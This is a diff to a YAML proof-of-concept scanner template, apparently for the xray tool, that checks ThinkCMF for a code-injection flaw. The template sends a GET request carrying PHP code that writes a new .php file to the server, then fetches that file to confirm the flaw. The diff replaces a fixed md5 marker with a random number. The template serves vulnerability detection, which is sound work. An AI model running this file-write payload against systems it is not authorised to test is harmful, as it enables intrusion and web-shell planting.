@@ -1,14 +1,15 @@
 name: poc-yaml-thinkcmf-write-shell
 set:
   r: randomInt(10000,20000)
+  r1: randomInt(1000000000,2000000000)
 rules:
   - method: GET
-    path: "/index.php?a=fetch&content=%3C?php+file_put_contents(%22{{r}}.php%22,%22%3C?php+echo+md5(123);%22);"
+    path: "/index.php?a=fetch&content=%3C?php+file_put_contents(%22{{r}}.php%22,%22%3C?php+echo+{{r1}};%22);"
     expression: "true"
   - method: GET
     path: "/{{r}}.php"
     expression: |
-      status == 200 && body.bcontains(b'202cb962ac59075b964b07152d234b70')
+      status == 200 && body.bcontains(bytes(string(r1)))
 
 detail:
   author: violin
